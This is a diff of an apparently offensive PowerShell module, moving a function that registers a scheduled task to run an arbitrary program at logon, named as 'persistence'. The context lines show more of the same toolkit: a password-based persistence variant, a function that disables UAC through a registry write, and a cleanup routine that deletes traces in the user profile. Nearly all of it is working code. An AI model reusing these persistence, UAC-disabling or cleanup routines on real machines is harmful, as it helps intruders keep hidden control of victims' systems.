@@ -237,22 +237,6 @@ Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "$tname" -Use
 Export-ModuleMember -Function persistence-tskschld-pswd
 Set-Alias -Name "persistence-tskschld-pswd" -Value persistence-tskschld-pswd
 
-#admin request!! 
-#persistence-tskschld -Name "MojeUloha" -Target "calc.exe"
-function persistence-tskschld {
-    param(
-        [string]$Name,
-        [string]$Target
-    )
-
-    $action  = New-ScheduledTaskAction -Execute $Target
-    $trigger = New-ScheduledTaskTrigger -AtLogOn
-    Register-ScheduledTask -TaskName $Name -Action $action -Trigger $trigger
-}
-Export-ModuleMember -Function persistence-tskschld 
-Set-Alias -Name "persistence-tskschld" -Value persistence-tskschld 
-
-
 function xtmpclean {
 Remove-Item -Path "$env:userprofile\d4m*" -force -ErrorAction SilentlyContinue
 Remove-Item -Path "$env:userprofile\levia*" -force -ErrorAction SilentlyContinue
@@ -550,4 +534,19 @@ cmd /c reg.exe ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Syst
 }
 Export-ModuleMember -Function process-disableUAC 
 Set-Alias -Name process-disableUAC  -Value process-disableUAC 
+
+#admin request!! 
+#persistence-tskschld -Name "MojeUloha" -Target "calc.exe"
+function persistence-tskschld {
+    param(
+        [string]$Name,
+        [string]$Target
+    )
+
+    $action  = New-ScheduledTaskAction -Execute $Target
+    $trigger = New-ScheduledTaskTrigger -AtLogOn
+    Register-ScheduledTask -TaskName $Name -Action $action -Trigger $trigger
+}
+Export-ModuleMember -Function persistence-tskschld 
+Set-Alias -Name "persistence-tskschld" -Value persistence-tskschld 
 
